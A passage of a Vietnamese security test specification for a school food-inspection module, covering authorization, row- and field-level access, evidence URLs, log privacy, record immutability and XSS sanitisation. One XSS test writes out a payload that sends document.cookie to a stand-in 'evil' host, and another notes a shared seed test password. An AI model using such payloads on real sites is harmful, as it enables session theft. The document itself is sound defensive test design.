- ⚠️ Teacher **vẫn** được `GET /inspections/serving-gate` (§16: `✅ School`) — TC khẳng định ranh giới này để không over-block: giáo viên **cần** hỏi cổng trước khi phát suất

**Expected Result (FAIL):** 201 ⇒ giáo viên chấm điểm vệ sinh bếp — không có chuyên môn, và điểm đó chảy vào Báo cáo Tuân thủ ATTP (BR-104).

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-004 — Service Caterers gọi POST /kitchen-inspections → 403

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-863`
**Test File:** `web/InspectionSecurityTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-34`
**Oracle Source:** `TDS` §16 (`POST /kitchen-inspections` = ❌ ở cột SERVICE CATERERS) + §1.7 UC-014 actor = Medical Staff + `TDS` §13 hàng `SEC-07-04`

**Expected Result (PASS):**
- **403** `INSP-005`
- Nhưng `GET /kitchen-inspections` → **200** (§16: `✅ School — đọc kết quả bếp mình`) — ranh giới: **đọc được kết quả, không tự chấm điểm**
- `POST /kitchen-inspections/{code}/confirm` → **200** nếu là đơn vị bị kiểm (`TC-023`)

**Expected Result (FAIL):** 201 ⇒ **đơn vị bị kiểm tự chấm điểm mình** — xung đột lợi ích trực tiếp, phá toàn bộ ý nghĩa của UC-014.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-005 — Caterer A đọc phiên của Caterer B → 403 (BR-099 row-level)

**Severity:** `CRITICAL` · **OWASP:** `A01:2021 (BOLA)` · **CWE:** `CWE-639 — Authorization Bypass Through User-Controlled Key`
**Test File:** `web/RowLevelAccessTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-18`
**Constraint Ref:** `TDS §17.1 C8`
**Oracle Source:** **BR-099** nguyên văn — *"**Medical Staff** và **School Administration** xem **toàn bộ** hồ sơ kiểm tra; **Service Caterers** chỉ xem hồ sơ **do mình thực hiện**"* + `TDS` §16 (`✅ Own`) + `TDS` §13 hàng `SEC-07-05` + `TDS` §15.2

**Preconditions:** `FX-001` phiên của `SUP-001`; `FX-005` phiên của `SUP-002`; `FX-021` JWT `partnerId=SUP-002`.

**Test Steps (Attack Simulation):**
1. `FX-021` → `GET /inspections/{code của SUP-001}`.
2. `FX-021` → `GET /inspections` (danh sách).
3. `FX-021` → `PUT`/`POST steps` trên phiên của `SUP-001`.
4. `FX-022` (Medical) → cùng phiên.

**Expected Result (PASS):**
- (1) → **403** `INSP-005` *(hoặc 404 — TC chấp nhận cả hai nhưng phải **nhất quán**; ghi rõ lựa chọn vào TDS)*
- (2) → **200** nhưng `items` **chỉ** phiên `partner_id = SUP-002`; `total` khớp
- (3) → **403**; DB không đổi
- (4) → **200** (Medical xem toàn trường — BR-099)
- Filter row-level áp ở **repository/Specification**, không chỉ ở kiểm sau khi load (test bằng cách assert SQL có `partner_id = ?`)

**Expected Result (FAIL):**
- (2) trả cả phiên của `SUP-001` ⇒ **rò dữ liệu chéo giữa các nhà cung cấp** — `00_Common_Conventions.md` D1 nêu đúng rủi ro này (`partnerId` là khoá cách ly dữ liệu)
- Lọc ở FE mà backend trả full ⇒ vẫn là rò rỉ

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-006 — schoolId/partnerId trong query PHẢI bị bỏ qua

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-639`
**Test File:** `web/RowLevelAccessTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-35`
**Constraint Ref:** `TDS §17.1 C8`
**Oracle Source:** `TDS` §4.3 + §17.1 C8 (*"`schoolId`/`partnerId` lấy **từ JWT**"*) + `TDS` §13 hàng `SEC-07-06` *(hàng gốc nói "Sửa `overall` trực tiếp qua PUT" — mở rộng sang tenant key)* + `00_` §2b-2 (nhóm key điều khiển)

**Test Steps (Attack Simulation):** `GET /inspections?partnerId=SUP-001` bằng `FX-021` (JWT `SUP-002`) · `?schoolId=SCH-002` · `?partner_id=SUP-001` (snake_case) · `GET /inspections/{code thuộc SCH-002}`.

**Expected Result (PASS):**
- 3 biến thể đầu → **200** nhưng kết quả **chỉ** trong phạm vi JWT
- Biến thể cuối → **404** (không lộ sự tồn tại tài nguyên trường khác)
- `schoolId`/`partnerId` nằm trong **danh sách key bị loại** của `InspectionSpec`, cùng nhóm `CONTROL` (`00_` §2b-2)

**Expected Result (FAIL):** trả dữ liệu ngoài phạm vi ⇒ multi-tenant escalation; với MF07 là rò rỉ **hồ sơ pháp lý** của trường/nhà thầu khác.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-007 — Ma trận 7 role × 29 endpoint khớp §16 100%

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-863`
**Test File:** `web/InspectionAuthorizationMatrixTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-34`
**Oracle Source:** **`TDS-MF07_Backend.md` §16** (20 hàng × 7 cột), dẫn từ **BR-007**, **BR-099** + `TDS` §13 hàng `SEC-07-08`
**Kỹ thuật:** Data-driven / Parameterized (**203 tổ hợp**)

**Test Steps:**
1. Khai bảng §16 thành `Map<Endpoint, Set<RoleKey>>` **trong test** (oracle nằm trong test, **không** đọc từ production code — chống tautology AP-AI-002).
2. `@ParameterizedTest` mọi (role × endpoint).
3. role ∈ allowed → **không** 403; role ∉ allowed → **403**.

**Expected Result (PASS):**
- 203/203 khớp §16; in bảng lệch dạng `role | endpoint | expected | actual` nếu có
- **`SYS_ADMIN` bị ❌** ở `POST /inspections`, `POST steps`, `co-sign`, `reinspect`, `POST /kitchen-inspections`, `POST /violations`, `export-pdf` — least privilege, **không** có ngoại lệ "admin làm được tất"
- `SUPPLIER` ❌ toàn bộ

**Expected Result (FAIL):** bất kỳ ô lệch ⇒ ghi vào §8 và **chặn** Nam final approve (§6).

**Current Status:** 🔴 Not written
**Implementation Note:** nếu §16 đổi, **sửa bảng trong test trước** (đỏ) rồi mới sửa `@PreAuthorize` — đúng thứ tự TDD.

---

#### MF07-TC-SEC-008 — Phân quyền THEO FIELD trên inspections (Caterer ↔ Medical)

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-863`
**Feature Under Test:** `PUT /api/v1/inspections/{code}` — kiểm quyền theo **field** trong payload
**Test File:** `web/FieldLevelAuthorizationTest.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-19`, `COND-40` · **Constraint Ref:** `TDS §17.1 C10`
**Oracle Source:** `TDS` **§16 bảng field-level** (2 hàng đầu) + cảnh báo cuối §16 + **BR-099**
**Kỹ thuật:** Decision Table Testing

| # | Role | Field trong body | Expected |
|---|---|---|---|
| a | SERVICE_CATERERS (Own) | `step1`/`step2`/`step3`/`coreTemp`/`step2Rows`/`formHeader` | **200** |
| b | SERVICE_CATERERS (Own) | `medicalReviewResult`/`medicalReviewBy` | **403** ← ca tấn công |
| c | SERVICE_CATERERS (Own) | `overall` (ghi trực tiếp) | **403** — `overall` do service tính (ADR-M07-02) |
| d | MEDICAL_STAFF | 4 field `medicalReview*` | **200** |
| e | MEDICAL_STAFF | `step2`/`coreTemp` | **403** ← ca tấn công |
| f | MEDICAL_STAFF | trộn `medicalReviewResult` + `coreTemp` | **403** — reject **cả request**, không ghi một phần |
| g | SCHOOL_ADMIN | bất kỳ field nội dung | **403** |
| h | SERVICE_CATERERS (**không** Own) | bất kỳ | **403** (BR-099) |

**Expected Result (PASS = hệ thống an toàn):** đúng 8 hàng; ở mọi ca 403 DB **không** đổi field nào.

**Expected Result (FAIL = lỗ hổng tồn tại):**
- (b)/(c) trả 200 ⇒ **đơn vị suất ăn tự ghi kết luận giám sát của Y tế** và tự set `overall=PASSED` ⇒ vô hiệu hoá BR-098 + BR-099 cùng lúc; bữa ăn trượt kiểm thực được phê duyệt
- (e) trả 200 ⇒ Y tế sửa số nhiệt độ của bếp ⇒ mất tính độc lập giữa người thực hiện và người giám sát
- (f) ghi một phần ⇒ lách được bằng cách trộn field

**Current Status:** 🔴 Not written
**Implementation Note:** khai 6 nhóm field §16 thành **enum** `FieldGroup` + map `RoleKey → Set<FieldGroup>`; từ chối request có field ngoài quyền **trước** khi merge.

---

#### MF07-TC-SEC-009 — Medical Staff KHÔNG tự phê duyệt biên bản của chính mình

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-863`
**Feature Under Test:** `PUT /api/v1/violations/{code}` — field `resolution`/`status`/`rejectReason`
**Test File:** `web/FieldLevelAuthorizationTest.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-19` · **Constraint Ref:** `TDS §17.1 C10`
**Oracle Source:** `TDS` §16 bảng field-level (2 hàng `violations`) + cảnh báo nguyên văn cuối §16: *"Nếu chỉ gác ở mức 'role nào được gọi `PUT /violations/**`' thì **Medical Staff tự phê duyệt biên bản xử lý của chính mình** — vi phạm BR-186"* + **BR-186** *(LOW → Medical Staff, MEDIUM/HIGH → School Administration)*
**⚠️ Ranh giới module (L10/CF-6):** **luồng phê duyệt UC-180/182 thuộc MF11.** TC này chỉ khẳng định **MF07 không được mở cửa** cho Medical Staff ghi `resolution` ở luồng phê duyệt. Logic phân nhánh LOW/MEDIUM/HIGH của BR-186 **test ở MF11**.

| # | Role | Field | `severity` | Expected |
|---|---|---|---|---|
| a | MEDICAL_STAFF (người lập) | `actionTaken`/`handledBy`/`pdfExported`/`signedRecordFiles` | — | **200** |
| b | MEDICAL_STAFF (người lập) | `resolution: APPROVED` | MEDIUM | **403** ← ca tấn công |
| c | MEDICAL_STAFF | `rejectReason` | MEDIUM | **403** |
| d | SCHOOL_ADMIN | `resolution`/`rejectReason` | MEDIUM | **200** |
| e | SERVICE_CATERERS | `resolution` | — | **403** |
| f | MEDICAL_STAFF | `resolution: PENDING_APPROVAL` (gửi duyệt, không phải duyệt) | MEDIUM | **200** — gửi duyệt là việc của người lập |

**Expected Result (PASS):** đúng 6 hàng. Ca (f) khẳng định ranh giới **gửi duyệt ≠ phê duyệt**.

**Expected Result (FAIL):** (b) trả 200 ⇒ Y tế lập biên bản rồi **tự duyệt** ⇒ không còn kiểm soát 2 lớp; biên bản xử lý nhà thầu mất giá trị đối chứng.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-010 — Ảnh bằng chứng chỉ truy cập qua pre-signed URL

**Severity:** `HIGH` · **OWASP:** `A01:2021` · **CWE:** `CWE-425 — Direct Request (Forced Browsing)`
**Legal:** PDPD — ảnh có thể chứa hình ảnh nhân viên bếp
**Feature Under Test:** `ObjectStoragePort` + endpoint trả URL ảnh
**Test File:** `web/EvidenceAccessTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-36`
**Oracle Source:** `ADR-M07-04` (*ảnh lưu tham chiếu ở object storage; DB giữ `url`, `uploaded_at`, `size`, `sha256`*) + `TDS` §13 hàng `SEC-07-06` (*"Truy cập ảnh bằng chứng không qua pre-signed URL → 403"*) + `TDS` §1 Data Classification

**Test Steps (Attack Simulation):**
1. Lấy `url` ảnh từ `GET /inspections/{code}` → gọi trực tiếp **không** JWT/không token.
2. Đoán URL theo khuôn (`/uploads/INSP-.../1.jpg`).
3. Dùng pre-signed URL **hợp lệ**.
4. Dùng pre-signed URL **đã hết hạn**.

**Expected Result (PASS):**
- (1)(2) → **403**
- (3) → **200** trả bytes ảnh
- (4) → **403**
- URL trong response là **pre-signed có thời hạn**, không phải đường dẫn tĩnh đoán được
- Caterer `SUP-002` **không** lấy được pre-signed URL của ảnh thuộc phiên `SUP-001` (BR-099 áp cả cho ảnh)

**Expected Result (FAIL):** ảnh đọc được bằng URL đoán ⇒ hình ảnh nhân viên bếp + hiện trạng vi phạm rò ra ngoài — sự cố PDPD phải báo cáo.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-011 — Log KHÔNG lộ định danh nhân viên / đại diện Nhà thầu

**Severity:** `HIGH` · **OWASP:** `A09:2021` · **CWE:** `CWE-532 — Insertion of Sensitive Information into Log File`
**Legal:** **PDPD (Luật 91/2025)** + BR-183 (26/07/2026 — biên bản nhắm **đơn vị**, không nhắm cá nhân)
**Test File:** `web/ViolationPrivacyTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-37`
**Oracle Source:** `TDS` §14.2 nguyên văn — *"PDPD: log KHÔNG chứa định danh cá nhân nhân viên Nhà thầu (BR-183 sửa 26/07/2026)… Expected: No output (chỉ dữ liệu lịch sử trong DB, không log ra mới)"*

**Test Steps:**
1. Tạo/đọc/xuất PDF biên bản; bắt log bằng `LogCaptor`.
2. Đọc bản ghi lịch sử `FX-015` (**có** `staffName`).
3. Chạy grep trên file log test.

**Expected Result (PASS):**
- Log **không** chứa `staffName`, `staffPosition`, `caterersRepresentativeId` dưới dạng plaintext
- (2) → API **vẫn trả** `staffName` của bản ghi cũ (L11 — đọc được), nhưng **không** log ra
- Kiểm tự động (CI):
  ```bash
  grep -rniE "staffName|staffPosition|caterersRepresentativeId" target/*.log
  # Expected: no output (§14.2 TDS)
  ```

**Expected Result (FAIL):** log có định danh ⇒ dữ liệu cá nhân nhân viên nhà thầu nằm trong log tập trung, ngoài phạm vi mục đích thu thập.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-012 — Ảnh biên bản đã ký có sha256 — phát hiện thay bằng chứng

**Severity:** `HIGH` · **CWE:** `CWE-345 — Insufficient Verification of Data Authenticity`
**Legal:** BR-211 (bản ký là bằng chứng pháp lý)
**Test File:** `web/SignedRecordIntegrityTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-38`
**Oracle Source:** `ADR-M07-04` nguyên văn — *"ảnh biên bản đã ký là bằng chứng pháp lý — cần **checksum để chống sửa**"* + `TDS` §14.2 (*"Ảnh bằng chứng: checksum có ghi — Expected: 0"* dòng thiếu checksum)

**Test Steps:**
1. Upload ảnh ký → đọc `sha256` trong DB.
2. Thay file ở storage bằng ảnh khác (giữ nguyên tên) → gọi endpoint xác minh.
3. Truy vấn tìm bản ghi thiếu checksum.

**Expected Result (PASS):**
- (1) → `sha256` khớp checksum tính lại từ bytes gốc
- (2) → xác minh **phát hiện lệch**; trả cảnh báo/`409`, **không** im lặng
- (3) → **0 dòng**:
  ```sql
  SELECT code FROM violation_records
   WHERE signed_record_photo_url IS NOT NULL AND signed_record_sha256 IS NULL;
  -- Expected: 0 rows
  ```

**Expected Result (FAIL):** không lưu checksum ⇒ ảnh bản ký có thể bị thay sau khi upload mà không ai biết ⇒ mất giá trị chứng cứ.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-013 — DELETE hồ sơ kiểm thực PHẢI bị chặn (hồ sơ pháp lý)

**Severity:** `CRITICAL` · **OWASP:** `A01:2021` · **CWE:** `CWE-284 — Improper Access Control`
**Legal:** **QĐ 1246/QĐ-BYT** + **Luật ATTP 55/2010/QH12** — hồ sơ kiểm thực là hồ sơ bắt buộc lưu
**Feature Under Test:** `DELETE /api/v1/inspections/{code}`
**Test File:** `web/InspectionImmutabilityTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-26`
**Oracle Source:** `TDS` §9.2 hàng #5 nguyên văn — *"⬜ **CẤM** — hồ sơ pháp lý QĐ 1246, không được xoá (§4.2)"* + `TDS` §4.2 + §12.2 (*"⚠️ NẾU ĐÃ CÓ DỮ LIỆU KIỂM THỰC THẬT: KHÔNG drop — đó là hồ sơ pháp lý (QĐ 1246)"*)
**Kỹ thuật:** Error Guessing (dùng role cao nhất để lách luật)

**Test Steps:** `DELETE /inspections/{code}` bằng lần lượt 7 role, gồm `system-admin`; và thử `PUT` sửa `overall` trực tiếp (`TDS` §13 hàng `SEC-07-07`).

**Expected Result (PASS):**
- **405 Method Not Allowed** hoặc **403** cho **mọi** role kể cả `system-admin` — TC chấp nhận cả hai nhưng phải **nhất quán** và ghi rõ vào TDS §9.2
- `PUT` sửa `overall` → **403** (`overall` do service tính — `TC-SEC-008` ca (c))
- DB: bản ghi **vẫn còn**; **không** có soft-delete flag nào cho `inspection_sessions` (khác với checklist — hồ sơ kiểm thực không được ẩn lẫn xoá)

**Expected Result (FAIL):** xoá được ⇒ **mất hồ sơ bắt buộc theo QĐ 1246**; khi điều tra ngộ độc (MF11 truy vết sự cố → món → lô) chuỗi bằng chứng bị đứt và trường chịu trách nhiệm pháp lý.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-014 — Lách gate MSG-095 bằng gọi API trực tiếp

**Severity:** `CRITICAL` · **OWASP:** `A04:2021 — Insecure Design` · **CWE:** `CWE-602 — Client-Side Enforcement of Server-Side Security`
**Legal:** BR-211 (*gate chặn cứng*)
**Test File:** `web/ViolationGateBypassTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-16`
**Oracle Source:** **BR-211** + **MSG-095** + **L22/CF-30** nguyên văn — *"Gate MSG-095 chỉ tồn tại phía client — nút bị `disabled`, nhưng **gọi thẳng API là lách được**"*
**Kỹ thuật:** Error Guessing (bypass UI control)

**Test Steps (Attack Simulation):**
1. Biên bản `signed_record_photo_url = NULL` → `PUT` trực tiếp `{"resolution":"APPROVED"}` bằng School Admin.
2. Thử `{"status":"CLOSED"}`.
3. Thử gửi kèm `signedRecordFiles: ["fake.jpg"]` (chuỗi bịa, chưa upload thật).

**Expected Result (PASS):**
- (1)(2) → **409** `VIO-095` với message MSG-095 nguyên văn; DB **không** đổi
- (3) → **409** — gate kiểm **bản ghi upload thật trong storage + có `sha256`**, không tin chuỗi tên file trong payload
- Gate nằm ở **service**, nên **cùng** hiệu lực khi MF11 gọi ở luồng UC-182 (L10)

**Expected Result (FAIL):** trả 200 ⇒ biên bản được duyệt mà **chưa từng có bản ký tay 2 bên** ⇒ văn bản vô hiệu; và đây là lỗ hổng **đang tồn tại** trong mock, không phải giả thuyết.

**Current Status:** 🔴 Not written

---

#### MF07-TC-SEC-015 — MF09 KHÔNG có đường vòng nào ngoài serving-gate

**Severity:** `CRITICAL` · **OWASP:** `A04:2021` · **CWE:** `CWE-602`
**Feature Under Test:** ranh giới module MF07 ↔ MF09
**Test File:** `web/ServingGateSoleEntryTest.java` · **TDD Phase:** 🔴 RED
**Condition Ref:** `COND-09` · **Constraint Ref:** `TDS §17.1 C4`
**Oracle Source:** **BR-094** + ràng buộc **C3** `data_model.puml` + `TDS` §17.1 **C4** nguyên văn (*"`serving-gate` là **chốt chặn duy nhất** cho MF09… **Không được có đường vòng nào khác**"*) + **L17/CF-20** (*màn phát suất hiện tự lọc client-side*) + AP-AI-010
**Kỹ thuật:** Error Guessing + kiểm tra kiến trúc (static analysis)

**Test Steps:**
1. Static check: MF09 **không** import repository/entity của MF07.
2. Static check: MF09 **không** query bảng `inspection_sessions`.
3. Runtime: gọi API phát suất của MF09 khi phiên `FAILED` → assert bị chặn.
4. Runtime: gọi API phát suất khi **không có phiên nào** → assert bị chặn.

**Expected Result (PASS):**
- (1)(2) → không kết quả:
  ```bash
  grep -rn "com.sfms.mf07" src/main/java/com/sfms/serving/   # Expected: no output
  grep -rniE "inspection_sessions" src/main/java/com/sfms/serving/ # Expected: no output
  ```
- (3) → phát suất bị chặn với `reasonCode = INSPECTION_FAILED`
- (4) → bị chặn với `reasonCode = NO_SESSION` (khớp smoke test §11.3 TDS)
- MF09 chỉ giao tiếp qua **`ServingGatePort`** (interface do MF07 cung cấp) — đúng quy ước `00_` §4b (*"tham chiếu bằng ID, KHÔNG import class entity module khác"*)

**Expected Result (FAIL):**
- MF09 tự query bảng ⇒ **hai nguồn sự thật** cho quyết định an toàn quan trọng nhất; sửa luật ở MF07 không có hiệu lực ở MF09
- Client tự lọc (trạng thái hiện tại L17) ⇒ **tắt JS hoặc gọi API trực tiếp là phát được suất trượt kiểm thực**

**Current Status:** 🔴 Not written
**Implementation Note:** TC này cần **Minh** gỡ lọc client-side ở `meal-service/page.tsx:150` và chuyển sang gọi `serving-gate`. Ưu tiên cao — là mắt nối trục xương sống.

---

#### MF07-TC-SEC-016 — description biên bản là HTML → phải sanitize (XSS)

**Severity:** `HIGH` · **OWASP:** `A03:2021 — Injection` · **CWE:** `CWE-79 — Cross-site Scripting`
**Test File:** `web/ViolationSanitizeTest.java` · **TDD Phase:** 🔴 RED · **Condition Ref:** `COND-42`
**Oracle Source:** **CF-27** nguyên văn — *"`ViolationRecord.description` là chuỗi **HTML** sinh từ vùng `contentEditable` của FE… Backend **sanitize HTML** (chống XSS khi render lại ở màn BGH/báo cáo), giữ nội dung, giới hạn độ dài **sau** sanitize"*

**Test Steps (Attack Simulation):**
1. `POST /violations` với `description` = `"<p>Vi phạm <b>nghiêm trọng</b></p><script>fetch('//evil/'+document.cookie)</script>"`.
2. `description` có `<img src=x onerror=alert(1)>`.
3. `description` HTML hợp lệ dài **2001** ký tự **sau** sanitize.
4. `GET` lại → kiểm nội dung trả về.
5. Xuất PDF (`TC-017`) → kiểm PDF không chứa script.

**Expected Result (PASS):**
- (1) → **201**; `<p>`/`<b>` **giữ lại**, thẻ `<script>` **bị loại**
- (2) → thuộc tính `onerror` bị loại; `<img>` giữ hoặc loại theo allow-list (ghi rõ allow-list vào TDS)
- (3) → **422** — giới hạn tính **sau** sanitize (CF-27), không phải trước
- (4) → nội dung trả về đã sanitize (sanitize lúc **ghi**, không chỉ lúc render — để dữ liệu trong DB cũng sạch)
- (5) → PDF không chứa payload

**Expected Result (FAIL):**
- Lưu nguyên `<script>` ⇒ XSS **stored** nổ ở màn BGH và màn báo cáo — nơi có quyền cao nhất
- Giới hạn độ dài **trước** sanitize ⇒ HTML dài bị chặn oan dù nội dung thật ngắn

**Current Status:** 🔴 Not written
**Implementation Note:** dùng thư viện đã kiểm định (OWASP Java HTML Sanitizer), **không** tự viết regex lọc thẻ.

> ⚠️ **`MF07-TC-SEC-016` nay thuộc MF11.** `M07-D07` (TDS §2.4) chuyển `violation_records` + `/api/v1/violations` sang MF11. TC này **giữ nguyên trong tài liệu** (Policy 4.4) làm nguồn cho MF11 chép — nhưng **không** chạy trong `mvn verify` của MF07. Cùng lý do với `MF07-TC-017`, `MF07-TC-018`, `MF07-TC-019`, `MF07-TC-020`, `MF07-TC-INT-011`, `MF07-TC-SEC-014`: đánh dấu `@Disabled("Chuyển MF11 — M07-D07")` khi dựng khung test.

---

#### MF07-TC-SEC-017 — D11: 4 vai trò thấy ĐÚNG CÙNG một tập field *(BẮT BUỘC — bổ sung 2026-08-03)*

| Thuộc tính | Giá trị |
|---|---|
| **Test Level** | Security / Contract |
| **Oracle Source** | **D11** (`02_Module_Completion_Workflow.md` §6) + **BR-099** + `TDS-MF07` §2.4 **`M07-D13`**, §17.1 **C16** |
| **Truy vết UC** | UC-112, UC-124 |
| **Mẫu tham chiếu** | `TestSpec-MF06` `TC-SEC-014` (module đầu tiên kết luận "D11 không áp dụng" mà vẫn viết TC) |

**Vì sao TC này tồn tại dù kết luận là "D11 không áp dụng":**
MF07 lọc theo **tập DÒNG** (BR-099 — Caterer chỉ thấy phiên `inspector_user_id = :me`), không phải tập **field**. Nên `M07-D13` chốt **một DTO duy nhất**, **không** khai `oneOf`. Nhưng MF02 và MF03 cũng "không có vấn đề" lúc viết TDS, rồi **về sau** mới thêm nhánh rút gọn theo vai trò — và lúc đó không có test nào phát hiện. TC này là cái chuông báo cho lần thêm nhánh đó.

**Preconditions:** 4 tài khoản seed THẬT trong `V900` (**không** `@WithMockUser` — nó không mang claim `partnerId`/`schoolId` mà BR-099 cần):
`U-0002` (medical-staff) · `U-0001` (school-admin) · `U-0003` (service-caterers, `SUP-001`) · `U-9001` (system-admin). Mật khẩu chung `P@ssw0rd123` (V900:11) — **sai 4 lần là khoá tài khoản** (BR-002), đừng hardcode sai trong fixture.

**Test Steps:**
1. Seed 3 `inspection_sessions` cho `SCH-HN-0042`: 2 phiên của `U-0003`, 1 phiên của caterer khác.
2. Với **mỗi** trong 4 vai trò: `GET /api/v1/inspections?page=1&pageSize=20`.
3. Lấy **tập key JSON** của phần tử đầu `items[0]` ở cả 4 response → so bằng `assertThat(keysOf(a)).isEqualTo(keysOf(b))` cho mọi cặp.
4. Lặp lại bước 2–3 với `GET /api/v1/kitchen-inspections` và `GET /api/v1/safety-signoffs`.
5. Assert **số DÒNG** khác nhau: Medical/SchoolAdmin/SystemAdmin thấy **3**, Caterer thấy **2** (BR-099).
6. Tải `GET /v3/api-docs`, assert cho `/api/v1/inspections`:
   - schema response là **`PagedResponseInspectionSummaryResponse`** — giữ **tiền tố `PagedResponse`** (S7, `OpenApiMetaContractIT`);
   - `items` có `$ref` **đúng kiểu**, **không** phải `{}` — đây là triệu chứng của `PagedResponse<?>` xoá kiểu (§6 workflow D11);
   - **không** có `oneOf` trong schema đó (`M07-D13` chốt một DTO).

**Expected Result (PASS):** tập field **giống hệt nhau** ở cả 4 vai trò trên cả 3 endpoint; chỉ tập dòng khác. `/v3/api-docs` khai `items` đúng kiểu, không `oneOf`.

**Expected Result (FAIL — nghĩa là gì):**
- Tập field **khác nhau** ⇒ ai đó đã thêm nhánh rút gọn theo vai trò mà **không** khai `oneOf` ⇒ FE phải đăng nhập từng vai trò gọi thử mới biết (đúng chi phí mà D11 sinh ra để tránh). Sửa: khai `oneOf` với record chỉ-để-sinh-tài-liệu, giữ tiền tố `PagedResponse`.
- `items` ra `{}` ⇒ chữ ký controller là `PagedResponse<?>`, springdoc không sinh được kiểu ⇒ type FE sinh tự động **rỗng**.
- Caterer thấy **3** dòng ⇒ **BR-099 vỡ** — lỗi nặng hơn cả D11.

**Current Status:** 🔴 Not written
**Implementation Note:** so tập key bằng `JsonNode.fieldNames()`, **không** so bằng `assertEquals` trên chuỗi JSON (thứ tự field không ổn định). Đếm D11 toàn dự án sau TC này: **2/13 → 3/13**.

---

#### MF07-TC-029 — D12: gửi field DẪN XUẤT và field SAI KIỂU → DB không đổi một byte *(BẮT BUỘC — bổ sung 2026-08-03)*

| Thuộc tính | Giá trị |
|---|---|
| **Test Level** | Integration (endpoint → DB) |
| **Oracle Source** | **D12** (`02_Module_Completion_Workflow.md` §6) + `TDS-MF07` §2.4 **`M07-D14`**, §17.1 **C15**, §10 `INSP-001`/MSG-138 · CF-16, CF-26 |
| **Truy vết UC** | UC-052, UC-014 |
| **Mẫu tham chiếu** | `TestSpec-MF05` `TC-027` |

**Bẫy mà TC này bắt:** Jackson **bỏ qua im lặng** field không khớp tên **hoặc không khớp kiểu**. Không lỗi, không cảnh báo, HTTP **200**, form báo thành công — nhưng **không lưu gì**. Biến thể "đúng tên sai kiểu" nguy hiểm hơn "sai tên": khi review bằng mắt, hai bên *trông như khớp*.

**Preconditions:** 1 phiên `INSP-20260803-L` (`overall = IN_PROGRESS`, `step1 = PASSED`, `core_temp = 78.0`), 1 phiên kiểm bếp `KIN-2026-018` (`score = 55`, `result = FAILED`, 20 hạng mục / 11 đạt).

**Test Steps — (a) FIELD DẪN XUẤT (server tự đặt, client KHÔNG được gửi):**
1. `PUT /api/v1/inspections/INSP-20260803-L` body `{"overall":"PASSED","decidedAt":"2026-08-03T04:00:00Z","gps":"21.0,105.8","coSignedAt":"2026-08-03T04:00:00Z"}`
   → **422 `INSP-001`** (MSG-138), `$.error.details` liệt kê **đúng 4 tên field** bị từ chối.
2. `SELECT overall, decided_at, gps, co_signed_at FROM inspection_sessions WHERE code='INSP-20260803-L'`
   → **`IN_PROGRESS`, NULL, NULL, NULL** — không đổi một byte.
3. `POST /api/v1/kitchen-inspections` body có `"score":100` + `"result":"PASSED"` kèm `itemResults` chỉ **11/20** đạt
   → 201, nhưng `SELECT score, result FROM kitchen_inspections WHERE code=?` ra **`55`, `FAILED`** — backend **tính lại** từ `itemResults` và **bỏ qua** giá trị FE gửi (CF-26 / BR-100 / BR-104).
4. `POST /api/v1/violations`-tương-đương của MF07 không còn tồn tại (`M07-D07`) — thay bằng: gửi `"repeatSuspect": false` kèm request bất kỳ của MF07 → field **không tồn tại trong DTO**, `$.error.details` **không** nhắc tới nó (đã bỏ hẳn, CF-16).

**Test Steps — (b) ĐÚNG TÊN, SAI KIỂU (bẫy im lặng của Jackson):**
5. `PUT /api/v1/inspections/INSP-20260803-L` body `{"coreTemp":"80"}` — **string** thay vì number
   → **422 `INSP-001`**, **không phải 200**. `SELECT core_temp` vẫn ra **`78.0`**.
6. `POST /api/v1/kitchen-inspections` body `{"score":"85", ...}` — string thay number → **422**, không tạo bản ghi nào.
7. `PUT /api/v1/inspections/INSP-20260803-L` body `{"date":"03/08/2026"}` — **D4**: backend **parse khoan dung** dạng này (mock đang gửi vậy) ⇒ **200**, và `GET` trả lại **`"2026-08-03"`** ISO. ⚠️ Đây là ca **duy nhất** trong TC này mà 200 là đúng — ghi rõ để người sửa test sau không "dọn" nhầm.
8. `PUT` body `{"mealType":"Bữa trưa"}` → **D6**: parse khoan dung ⇒ 200, `GET` trả **`"LUNCH"`**; `SELECT meal_type` ra **`LUNCH`**.

**Expected Result (PASS):** bước 1–2, 5–6 → 422 + DB nguyên vẹn; bước 3 → điểm tính lại phía server; bước 7–8 → 200 + response chuẩn hoá về ISO/SCREAMING_SNAKE.

**Expected Result (FAIL — nghĩa là gì):**
- Bước 1 hoặc 5 trả **200** ⇒ đúng bẫy D12: DTO đang dùng kiểu khoan dung (`String`/`Object`) hoặc thiếu `@JsonIgnoreProperties(ignoreUnknown = false)`. Người dùng bấm Lưu, thấy toast xanh, dữ liệu **không vào DB**.
- Bước 3 ra `score = 100` ⇒ **client quyết định điểm vệ sinh bếp** — BR-100/BR-104 không được enforce ở server, gọi thẳng API là tự chấm mình 100 điểm.
- Bước 7 trả 422 ⇒ backend từ chối định dạng mock đang gửi ⇒ **mọi màn FE hiện tại gãy** khi đổi `baseURL`.

**Current Status:** 🔴 Not written
